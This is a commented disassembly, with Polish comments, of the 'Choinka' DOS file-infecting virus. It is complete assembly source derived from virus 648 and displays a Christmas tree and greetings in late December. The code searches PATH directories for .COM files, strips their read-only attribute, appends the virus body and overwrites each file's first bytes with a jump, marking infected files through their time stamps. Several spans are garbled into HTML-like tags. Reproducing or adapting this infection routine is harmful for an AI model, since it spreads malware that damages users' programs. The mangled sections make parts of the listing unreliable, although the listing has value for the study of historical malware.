

; Wirus Choinka. Otrzymany od Marka Sella 1990-06-10. Podobno ju§ dosy
; popularny wžr¢d polskich u§ytkownik¢w.
;
; Wirus wzorowany na 648. Od pierwowzoru r¢§ni si‘ pomini‘ciem zb‘dnych
; instrukcji NOP, zaniechaniem losowej destrukcji zbior¢w oraz wprowadzeniem
; wyžwietlania w okresie od 19 XII do 1 I danego roku rysunku choinki wraz z
; odpowiednimi §yczeniami (po angielsku).

LF    EQU    0AH
CR    EQU    0DH

S0000	 SEGMENT
    ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
    ORG    $+0100H

L0100:
    JMP    L71CF			    ;0100 E9 CC 70

;    .
    org    71CFh
;    .

L71CF:
    PUSH    CX		   ;??? 	     ;71CF 51
    MOV    DX,OFFSET L73A9 ;baza zmiennych	  ;71D0 BA A9 73

    ;--- odtworzenie zamazanych bajtow
    CLD 			   ;71D3 FC
    MOV    SI,DX			     ;71D4 8B F2
    ADD    SI,0AH			     ;71D6 83 C6 0A
    MOV    DI,OFFSET L0100		     ;71D9 BF 00 01
    MOV    CX,3 	   ;liczba bajtow    ;71DC B9 03 00
    REPZ    MOVSB	   ;odtworzenie starych    ;71DF F3 A4

    ;--- sprawdzenie wersji DOS
    MOV    SI,DX			     ;71E1 8B F2
    MOV    AH,30H	   ;Get DOS version  ;71E3 B4 30
    INT    21H				     ;71E5 CD 21
    CMP    AL,0 	   ;<2.x ;71e7="" 3c="" 00="" jnz="" l71ee="" ;71e9="" 75="" 03="" jmp="" l7397="" ;-=""> tak, odpuszczamy    ;71EB E9 A9 01

    ;--- ustalenie DTA
L71EE:
    PUSH    ES				     ;71EE 06
    MOV    AH,2FH	   ;Get DTA	     ;71EF B4 2F
    INT    21H				     ;71F1 CD 21
    MOV    [SI],BX			     ;71F3 89 1C
    MOV    [SI+2],ES			     ;71F5 8C 44 02
    POP    ES				     ;71F8 07
    MOV    DX,5FH	   ;nowe DTA	     ;71F9 BA 5F 00
    ADD    DX,SI			     ;71FC 03 D6
    MOV    AH,1AH	   ;Set DTA	     ;71FE B4 1A
    INT    21H				     ;7200 CD 21

    ;-- Szukanie sciezki
    PUSH    ES				     ;7202 06
    PUSH    SI				     ;7203 56
    MOV    ES,DS:2CH	   ;Segment Environmentu    ;7204 8E 06 2C 00
    MOV    DI,0 	   ;poczatek stringow	    ;7208 BF 00 00

L720B:
    POP    SI				     ;720B 5E
    PUSH    SI				     ;720C 56
    ADD    SI,1AH	   ;'PATH='          ;720D 83 C6 1A
    LODSB				     ;7210 AC
    MOV    CX,8000h			     ;7211 B9 00 80
    REPNZ    SCASB	   ;szukanie 'P'     ;7214 F2 AE
    MOV    CX,4 	   ;zostaly 4 literki;7216 B9 04 00

L7219:
    LODSB				     ;7219 AC
    SCASB				     ;721A AE
    JNZ    L720B	   ;to nie ta nazwa  ;721B 75 EE
    LOOP    L7219	   ;nastepna literka ;721D E2 FA
    POP    SI		   ; <- znaleziono="" ;721f="" 5e="" pop="" es="" ;7220="" 07="" mov="" [si+16h],di="" ;ptr="" w="" environmencie="" ;7221="" 89="" 7c="" 16="" mov="" di,si="" ;7224="" 8b="" fe="" add="" di,1fh="" ;obszar="" roboczy="" ;7226="" 83="" c7="" 1f="" mov="" bx,si="" ;7229="" 8b="" de="" add="" si,1fh="" ;obszar="" roboczy="" ;722b="" 83="" c6="" 1f="" mov="" di,si="" ;722e="" 8b="" fe="" jmp="" short="" l7268="" ;bez="" katalogu="" (1="" raz)="" ;7230="" eb="" 36="" ;---="" nastepny="" katalog="" l7232:="" cmp="" word="" ptr="" [si+16h],0="" ;czy="" jest="" jeszcze="" ;7232="" 83="" 7c="" 16="" 00="" jnz="" l723b="" ;-=""> tak	     ;7236 75 03
    JMP    L736C	    ;-> nie	     ;7238 E9 31 01

L723B:
    PUSH    DS				     ;723B 1E
    PUSH    SI				     ;723C 56
    MOV    DS,ES:2CH	    ;Segment Environment    ;723D 26 8E 1E 2C 00
    MOV    DI,SI	   ;D0000	     ;7242 8B FE
    MOV    SI,ES:[DI+16H]  ;ptr w environmencie    ;7244 26 8B 75 16
    ADD    DI,1FH	   ;obszar roboczy   ;7248 83 C7 1F
L724B:
    LODSB			     ;724B AC
    CMP    AL,';'          ;delimiter ?      ;724C 3C 3B
    JZ	  L725A 	   ;-> koniec katalogu	  ;724E 74 0A
    CMP    AL,0 	   ;koniec PATH ?    ;7250 3C 00
    JZ	  L7257 	   ;-> tak	     ;7252 74 03
    STOSB		   ;bajt znaku	     ;7254 AA
    JMP    SHORT    L724B		     ;7255 EB F4

L7257:
    MOV    SI,0 			     ;7257 BE 00 00
L725A:
    POP    BX				     ;725A 5B
    POP    DS				     ;725B 1F
    MOV    [BX+16H],SI	   ;ptr w environmencie       ;725C 89 77 16
    CMP    BYTE PTR [DI-1],'\'    ;jest delimiter     ;725F 80 7D FF 5C
    JZ	  L7268 			     ;7263 74 03
    MOV    AL,'\'          ;dopisanie        ;7265 B0 5C
    STOSB				     ;7267 AA

L7268:
    MOV    [BX+18H],DI	   ;adres nazwy programu    ;7268 89 7F 18
    MOV    SI,BX	   ;baza danych      ;726B 8B F3
    ADD    SI,10H	   ;'*.com',0        ;726D 83 C6 10
    MOV    CX,6 	   ;dlugosc nazwy    ;7270 B9 06 00
    REPZ    MOVSB	   ;dopisanie do katalogu    ;7273 F3 A4
    MOV    SI,BX			     ;7275 8B F3
    MOV    AH,4EH	   ;Find First File  ;7277 B4 4E
    MOV    DX,1FH			     ;7279 BA 1F 00
    ADD    DX,SI	   ;offset D001F     ;727C 03 D6
    MOV    CX,3 	   ;attributes RO & Hidd    ;727E B9 03 00
    INT    21H				     ;7281 CD 21
    JMP    SHORT    L7289		     ;7283 EB 04

L7285:
    MOV    AH,4FH	   ;Find Next File   ;7285 B4 4F
    INT    21H				     ;7287 CD 21
L7289:
    JNB    L728D			     ;7289 73 02
    JMP    SHORT    L7232  ;-> Brak zbioru   ;728B EB A5

    ;<-- znaleziono="" ofiare="" l728d:="" mov="" ax,[si+75h]="" ;time="" of="" last="" write="" ;728d="" 8b="" 44="" 75="" and="" al,1eh="" ;7290="" 24="" 1e="" cmp="" al,1eh="" ;flaga="" zarazenia="" ;7292="" 3c="" 1e="" jz="" l7285="" ;-=""> juz zarazony  ;7294 74 EF
    CMP    WORD PTR [SI+79H],0EA60h;Size low   ;7296 81 7C 79 60 EA
    JA	  L7285 	   ;-> zbyt duzy     ;729B 77 E8
    CMP    WORD PTR [SI+79H],0AH    ;Size low  ;729D 83 7C 79 0A
    JB	  L7285 	   ;-> zbyt maly     ;72A1 72 E2
    MOV    DI,[SI+18H]	   ;adres nazwy pgm  ;72A3 8B 7C 18
    PUSH    SI				     ;72A6 56
    ADD    SI,7DH	   ;Name of file     ;72A7 83 C6 7D
L72AA:
    LODSB				     ;72AA AC
    STOSB		   ;Dopisanie	     ;72AB AA
    CMP    AL,0 			     ;72AC 3C 00
    JNZ    L72AA	   ;-> jeszcze nie koniec    ;72AE 75 FA
    POP    SI				     ;72B0 5E
    MOV    AX,4300h	   ;Get File Attributes    ;72B1 B8 00 43
    MOV    DX,1FH			     ;72B4 BA 1F 00
    ADD    DX,SI	   ;D001F	     ;72B7 03 D6
    INT    21H				     ;72B9 CD 21
    MOV    [SI+8],CX			     ;72BB 89 4C 08
    MOV    AX,4301h	   ;Set File Attributes    ;72BE B8 01 43
    and    cx,0FFFEh			     ;72C1 83 E1 FE
    mov    dx,1Fh			     ;72C4 BA 1F 00
    ADD    dx,si			     ;72C7 03 D6
    INT    21H				     ;72C9 CD 21
    MOV    AX,3D02h	   ;Open Handle R/W  ;72CB B8 02 3D
    MOV    DX,1FH	   ;D001F	     ;72CE BA 1F 00
    ADD    DX,SI			     ;72D1 03 D6
    INT    21H				     ;72D3 CD 21
    JNB    L72DA	   ;-> OK	     ;72D5 73 03
    JMP    L735F	   ;-> Blad	     ;72D7 E9 85 00

L72DA:
    MOV    BX,AX	   ;handle	     ;72DA 8B D8
    MOV    AX,5700h	   ;Get Date/Time of file    ;72DC B8 00 57
    INT    21H				     ;72DF CD 21
    MOV    [SI+4],CX	   ;Time of File     ;72E1 89 4C 04
    MOV    [SI+6],DX	   ;Date of File     ;72E4 89 54 06

; pomini‘to fragment specyficzny dla 648, realizuj†cy losowo, co ¢smy raz
; niszczenie infekowanego pliku

    MOV    AH,3FH	   ;Read handle      ;72E7 B4 3F
    MOV    CX,3 	   ;bytes	     ;72E9 B9 03 00
    MOV    DX,0AH			     ;72EC BA 0A 00
    ADD    DX,SI	   ;D000A	     ;72EF 03 D6
    INT    21H				     ;72F1 CD 21
    JB	  L734A 	   ;-> blad	     ;72F3 72 55
    CMP    AX,3 	   ;przeczytano bajtow	  ;72F5 3D 03 00
    JNZ    L734A			     ;72F8 75 50
    MOV    AX,4202h	   ;Move File ptr EOF+0    ;72FA B8 02 42
    MOV    CX,0 			     ;72FD B9 00 00
    MOV    DX,0 			     ;7300 BA 00 00
    INT    21H				     ;7303 CD 21
    JB	  L734A 	   ;-> blad	     ;7305 72 43
    MOV    CX,AX	   ;AX=dlugosc zbioru	;7307 8B C8
    SUB    AX,3 	   ;na dlugosc skoku	;7309 2D 03 00
    MOV    [SI+0EH],AX	   ;D000D+1	     ;730C 89 44 0E
    ADD    CX,02DAh	   ;PSP+dlugosc pgm wirusa    ;730F 81 C1 DA 02
    MOV    DI,SI			     ;7313 8B FE
    SUB    DI,01D8h			     ;7315 81 EF D8 01
    MOV    [DI],CX	   ;L71D0+1	     ;7319 89 0D
    MOV    AH,40H	   ;Write Handle     ;731B B4 40
    MOV    CX,0759h	   ;Dlugosc wirusa   ;731D B9 59 07
    NOP 				     ;7320 90
    MOV    DX,SI			     ;7321 8B D6
    SUB    DX,01DAh	   ;poczatek wirusa  ;7323 81 EA DA 01
    INT    21H				     ;7327 CD 21
    JB	  L734A 	   ;-> blad	     ;7329 72 1F
    CMP    AX,0759h	   ;czy calosc zapisano ?    ;732B 3D 59 07
    NOP 				     ;732E 90
    JNZ    L734A	   ;-> nie, blad     ;732F 75 19
    MOV    AX,4200h	   ;Move file ptr BOF +    ;7331 B8 00 42
    MOV    CX,0 			     ;7334 B9 00 00
    MOV    DX,0 			     ;7337 BA 00 00
    INT    21H				     ;733A CD 21
    JB	  L734A 	   ;-> blad	     ;733C 72 0C
    MOV    AH,40H	   ;Write Handle     ;733E B4 40
    MOV    CX,3 	   ;bytes	     ;7340 B9 03 00
    MOV    DX,SI			     ;7343 8B D6
    ADD    DX,0DH	   ;D000D	     ;7345 83 C2 0D
    INT    21H				     ;7348 CD 21
	    ;<- blad="" czytania="" zbioru="" l734a:="" mov="" dx,[si+6]="" ;date="" of="" file="" ;734a="" 8b="" 54="" 06="" mov="" cx,[si+4]="" ;time="" of="" file="" ;734d="" 8b="" 4c="" 04="" and="" cx,0ffe0h="" ;7350="" 83="" e1="" e0="" or="" cx,1eh="" ;7353="" 83="" c9="" 1e="" mov="" ax,5701h="" ;set="" date/time="" of="" file="" ;7356="" b8="" 01="" 57="" int="" 21h="" ;7359="" cd="" 21="" mov="" ah,3eh="" ;close="" handle="" ;735b="" b4="" 3e="" int="" 21h="" ;735d="" cd="" 21=""></-><- po="" bledzie="" otwarcia="" l735f:="" mov="" ax,4301h="" ;set="" file="" attributes="" ;735f="" b8="" 01="" 43="" mov="" cx,[si+8]="" ;atrybuty="" znalezione="" ;7362="" 8b="" 4c="" 08="" mov="" dx,1fh="" ;7365="" ba="" 1f="" 00="" add="" dx,si="" ;d001f="" ;7368="" 03="" d6="" int="" 21h="" ;736a="" cd="" 21=""></-><- nie="" znaleziono="" ofiary="" l736c:="" push="" ds="" ;736c="" 1e="" mov="" ah,1ah="" ;set="" dta="" ;736d="" b4="" 1a="" mov="" dx,[si]="" ;zastana="" wartosc="" dta="" ;736f="" 8b="" 14="" mov="" ds,[si+2]="" ;7371="" 8e="" 5c="" 02="" int="" 21h="" ;7374="" cd="" 21="" pop="" ds="" ;7376="" 1f="" ;="" istotna="" r¢§nica="" mi‘dzy="" choink†="" i="" 648.="" 648="" oddaje="" tu="" sterowanie="" do="" ;="" programu="" nosiciela="" mov="" ah,2ah="" ;get="" date="" ;7377="" b4="" 2a="" int="" 21h="" ;7379="" cd="" 21="" cmp="" dx,0c13h="" ;month="12," day="19" ;737b="" 81="" fa="" 13="" 0c="" jnb="" l7389="" ;-=""> po 18 grudnia    ;737F 73 08
    CMP    DX,0101h    ;month=1, day=1	     ;7381 81 FA 01 01
    JB	  L7389        ;wczesniejszy dzien !!!???    ;7385 72 02
    JMP    SHORT    L7397    ;-> data nie swiateczna  ;7387 EB 0E

L7389:
    MOV    DX,SI			     ;7389 8B D6
    ADD    DX,8AH	 ;adres choinki      ;738B 81 C2 8A 00
    MOV    AH,9        ;display string	     ;738F B4 09
    INT    21H				     ;7391 CD 21
    MOV    AH,0        ;czekaj na klawisz    ;7393 B4 00
    INT    16H				     ;7395 CD 16

L7397:
    POP    CX		 ;odtworzenie rejestrow    ;7397 59
    XOR    AX,AX			     ;7398 33 C0
    XOR    BX,BX			     ;739A 33 DB
    XOR    DX,DX			     ;739C 33 D2
    XOR    SI,SI			     ;739E 33 F6
    MOV    DI,OFFSET L0100	  ;adres startowy	 ;73A0 BF 00 01
    PUSH    DI				     ;73A3 57
    XOR    DI,DI			     ;73A4 33 FF
    RETN    0FFFFH	      ;uruchomienie programu	;73A6 C2 FF FF

;------------------------------------------------
;    Dane
;------------------------------------------------
L73A9	 label	  byte
D0000	 dw    0080h	    ;old DTA offset	   ;73A9 80 00
D0002	 dw    31D6h	    ;	  segment	   ;73AB D6 31
D0004	 dw    0975h	    ;Time of File	   ;73AD 75 09
D0006	 dw    144Dh	    ;Date of File	   ;73AF 4D 14
D0008	 dw    0020h	    ;atrybuty zbioru	   ;73B1 20 00
D000A	 db    0EBh,16h,4Dh ;schowane bajty	   ;73B3 EB 16 4D
D000D	 db    0E9h	    ;=JMP    (zastepstwo)  ;73B6 E9
D000E	 dw    70CCh	    ;przesuniecie	   ;73B7 cc 70
D0010	 DB    '*.COM',0    ;wzorzec szukania      ;73B9 2A 2E 43 4F 4D 00
D0016	 dw    002Ah	    ;ptr w PATH 	   ;73BF 2A 00
D0018	 dw    65D4h	    ;adres nazwy zb. w D001F ;73C1 D4 65
D001A	 DB    'PATH='                             ;73C3 50 41 54 48 3D

    ;--- obszar roboczy
D001F	 db    'MKS_DEMO.COM',0    ;73C8 4D 4B 53 5F 44 45 4D 4F 2E 43 4F 4D 00
    db	  'COM',0                  ;73D5 43 4F 4D 00
    db	  '                        ';73D9 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
    DB	  '                       ' ;73F1 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20

    ;--- nowe DTA
D005F	 db    3,'????????COM'  ;Reserved              ;7408 03 .. .. .. .. ...
	 db    3,'K',0,'0',0,'F',51h,0Fh,09h           ;7418 .. .. 51 0F 09
D0074	 db    20h		;Attribute found       ;741D 20
D0075	 dw    0975h		;Time of last write    ;741E 75 09
D0077	 dw    144Dh		;Date of last write    ;7420 4D 14
D0079	 dw    70CFH		;Size low	       ;7422 CF 70
D007B	 dw    0		;Size High	       ;7424 00 00
D007D	 db    'MKS_DEMO.COM',0    ;Name of file        ;7426 4D 4B 53 5F 44 45 4D 4F 2E 43 4F 4D 00

    ;--- Choinka
D008A	 label	  byte			      ;7433
 DB lf,cr
 db lf,cr,'                                      *'
 db lf,cr,'                                      *'
 db lf,cr,'                                   **°**'
 db lf,cr,'                                 *****°*****             '
 db lf,cr,'                                    **°**'
 db lf,cr,'                                 ****°****        '
 db lf,cr,'                               *******°*******'
 db lf,cr,'                           ***********°***********                '
 db lf,cr,'                                 ****°****'
 db lf,cr,'                              ******°°°******'
 db lf,cr,'                            *********°°°*********'
 db lf,cr,'                         ************°°°************          '
 db lf,cr,'                     ****************°°°****************'
 db lf,cr,'                 ********************°°°********************'
 db lf,cr,'             ************************°°°************************'
 db lf,cr,'                       ±       Merry Christmas       ±'
 db lf,cr,'          *            ±              &              ±            *'
 DB lf,cr,'         *²*           ±      a  Happy New Year      ±           *²*'
 DB lf,cr,'        **²**          ±  for all my lovely friends  ±          **²**'
 DB lf,cr,'      ****²****        ±            from             ±        ****²****'
 DB lf,cr,'    ******²******      ±      FATHER  CHRISTMAS      ±      ******²******'
 DB lf,cr,'                       ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±'
 DB lf,cr,'$'

S0000	 ENDS

    END    L0100

</-></--></-></2.x>